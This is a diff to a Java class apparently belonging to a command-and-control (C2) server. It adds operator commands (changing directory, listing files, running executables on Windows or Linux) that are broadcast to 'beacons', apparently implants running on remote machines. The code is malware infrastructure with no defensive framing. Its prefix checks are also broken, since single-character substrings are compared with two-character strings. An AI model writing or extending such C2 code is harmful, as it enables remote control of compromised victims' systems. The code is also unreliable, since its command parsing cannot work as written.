@@ -314,6 +314,23 @@ public class C2ServerUserHandler implements Runnable{
                     if(command.equals("q")){
                         currentUserPath = "";
                         break;
+                    } else if (command.substring(0,1).equals("cd")){
+                        // Change Current Directory
+                        currentDirectory = command.substring(3);
+                    } else if (command.equals("ls")){
+                        // List items of current directory
+                        C2server.broadcastToBeacons("Command " + clientIP + "_ls " + currentDirectory);
+                    } else if (command.equals("ls -la")){
+                        // List items with extra details of current directory
+                        C2server.broadcastToBeacons("Command " + clientIP + "_ls -la " + currentDirectory);
+                    } else if (command.substring(0,1).equals(".\\")){
+                        // if the first two characters are .\, then it is attempting to run an executable on windows, in the current directory.
+                        // Because we are not actually in the current directory, we will use &, followed by the full executable path
+                        C2server.broadcastToBeacons("Command " + clientIP + "_& " + currentDirectory + command.substring(2));
+                    } else if (command.substring(0,1).equals("./")){
+                        // If the first two characters are ./, then it is attempting to run an executable on linux in the current directory
+                        // Because we are not actually in the current directory, we will just use the full executable name
+                        C2server.broadcastToBeacons("Command " + clientIP + "_" + currentDirectory + command.substring(2));
                     } else {
                         // Send the Command
                         C2server.broadcastToBeacons("Command " + clientIP + "_" + command);
